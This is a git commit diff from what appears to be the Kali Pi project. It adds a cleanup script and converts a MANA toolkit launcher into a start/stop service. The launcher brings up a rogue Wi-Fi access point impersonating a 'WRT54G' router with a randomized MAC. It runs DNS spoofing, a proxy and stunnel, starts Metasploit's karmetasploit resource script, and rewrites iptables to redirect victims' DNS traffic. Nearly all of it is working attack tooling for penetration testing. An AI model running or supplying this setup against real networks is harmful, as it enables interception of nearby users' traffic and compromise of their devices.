344c0d6e9239890f74ea08429acc7cca4912e30d
Re4son <Re4son@users.noreply.github.com>
2017-02-02 15:53:36 +1100

    Localise kalipi-noupstream.sh

---
+++ Menus/mana/kalipi-cleanmana.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+pkill dnsmasq
+pkill sslstrip
+pkill sslsplit
+pkill hostapd
+pkill python
+pkill dnsspoof
+pkill tinyproxy
+pkill ruby
+iptables --policy INPUT ACCEPT
+iptables --policy FORWARD ACCEPT
+iptables --policy OUTPUT ACCEPT
+iptables -t nat -F
--- Menus/mana/kalipi-noupstream.sh
+++ Menus/mana/kalipi-noupstream.sh
@@ -1,49 +1,127 @@
 #!/bin/bash
+### BEGIN INIT INFO
+# Provides:          firelamb
+# Required-Start:    $remote_fs $syslog
+# Required-Stop:     $remote_fs $syslog
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: Control firelamb
+# Description:       Control firelamb
+### END INIT INFO
 
-phy=wlan0
+## Adjust these
+phy=wlan1
 conf=/etc/mana-toolkit/hostapd-mana.conf
 hostapd=/usr/lib/mana-toolkit/hostapd
+cmdline="${hostapd} ${conf}"
+HOSTNAME=WRT54G
+## End adjustment
 
-hostname WRT54G
-echo hostname WRT54G
-sleep 2
+PROGLONG=$(realpath $0)
+PROGSHORT=$(basename ${PROGLONG})
+PIDFILE="/var/run/"${PIDFILE:-"${PROGSHORT}.pid"}
 
-service network-manager stop
-rfkill unblock wlan
+usage() {
+  echo "Usage: `basename $0` {start|stop|restart|status}" >&2
+}
 
-ifconfig $phy down
-macchanger -r $phy
-ifconfig $phy up
+# Did we get an argument?
+if [[ -z "${1}" ]]; then
+  usage
+  exit 1
+fi
 
-sed -i "s/^interface=.*$/interface=$phy/" $conf
-sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /etc/mana-toolkit/karmetasploit.rc
-$hostapd $conf&
-sleep 5
-ifconfig $phy 10.0.0.1 netmask 255.255.255.0
-route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+# Get the PID from PIDFILE if we don't have one yet.
+if [[ -z "${PID}" && -e ${PIDFILE} ]]; then
+  PID=$(cat ${PIDFILE});
+fi
 
-dnsmasq -C /etc/mana-toolkit/dnsmasq-dhcpd.conf $phy
-dnsspoof -i $phy -f /etc/mana-toolkit/dnsspoof.conf&
-service apache2 start
-stunnel4 /etc/mana-toolkit/stunnel.conf
-tinyproxy -c /etc/mana-toolkit/tinyproxy.conf&
-msfconsole -r /etc/mana-toolkit/karmetasploit.rc&
 
-echo '1' > /proc/sys/net/ipv4/ip_forward
-iptables --policy INPUT ACCEPT
-iptables --policy FORWARD ACCEPT
-iptables --policy OUTPUT ACCEPT
-iptables -F
-iptables -t nat -F
-iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
+start() {
+        echo "--------------------------------"
+        echo "   STARTING $PROGSHORT"
+        echo "--------------------------------"
+        echo ${PIDFILE}
+        cat ${PIDFILE}
 
-echo "Hit enter to kill me"
-read
-pkill hostapd
-pkill dnsmasq
-pkill dnsspoof
-pkill tinyproxy
-pkill stunnel4
-pkill ruby
-service apache2 stop
-iptables -t nat -F
+        hostname $HOSTNAME
+        echo hostname WRT54G
+        sleep 2
+
+        service network-manager stop
+        rfkill unblock wlan
+
+        ifconfig $phy down
+        macchanger -r $phy
+        ifconfig $phy up
+
+        sed -i "s/^interface=.*$/interface=$phy/" $conf
+        sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /etc/mana-toolkit/karmetasploit.rc
+        $cmdline & echo $! > ${PIDFILE}
+        sleep 5
+        ifconfig $phy 10.0.0.1 netmask 255.255.255.0
+        route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+
+        dnsmasq -C /etc/mana-toolkit/dnsmasq-dhcpd.conf $phy
+        dnsspoof -i $phy -f /etc/mana-toolkit/dnsspoof.conf&
+        service apache2 start
+        stunnel4 /etc/mana-toolkit/stunnel.conf
+        tinyproxy -c /etc/mana-toolkit/tinyproxy.conf&
+        msfconsole -r /etc/mana-toolkit/karmetasploit.rc&
+
+        echo '1' > /proc/sys/net/ipv4/ip_forward
+        iptables --policy INPUT ACCEPT
+        iptables --policy FORWARD ACCEPT
+        iptables --policy OUTPUT ACCEPT
+        iptables -F
+        iptables -t nat -F
+        iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
+}
+stop() {
+
+        echo "--------------------------------"
+        echo "   STOPPING $PROGSHORT"
+        echo "--------------------------------"
+        if [[ -z "${PID}" ]]; then
+            echo "${PROGSHORT} is not running (missing PID)."
+        elif [[ -e "/proc/${PID}/cmdline" && "`tr -d '\0' < /proc/${PID}/cmdline`" == *"$( echo -e "${cmdline}" | tr -d '[:space:]')"* ]]; then
+            kill $1 ${PID}
+            pkill hostapd
+            pkill dnsmasq
+            pkill dnsspoof
+            pkill tinyproxy
+            pkill stunnel4
+            pkill ruby
+            iptables -t nat -F
+        else
+            echo "${PROGSHORT} is not running (tested PID: ${PID})."
+        fi
+}
+
+case "$1" in
+    start)
+       start
+       ;;
+    stop)
+       stop
+       ;;
+    restart)
+        stop
+        start
+        ;;
+    force-reload)
+        ;;
+    status)
+        if [[ -z "${PID}" ]]; then
+            echo "${PROGSHORT} is not running (missing PID)."
+        elif [[ -e "/proc/${PID}/cmdline" && "`tr -d '\0' < /proc/${PID}/cmdline`" == *"$( echo -e "${cmdline}" | tr -d '[:space:]')"* ]]; then
+            echo "${PROGSHORT} is running (PID: ${PID})."
+            exit 1
+        else
+            echo "${PROGSHORT} is not running (tested PID: ${PID})."
+            exit 0
+        fi
+        ;;
+    *)
+       echo "Usage: $0 {start|stop|status|restart}"
+esac
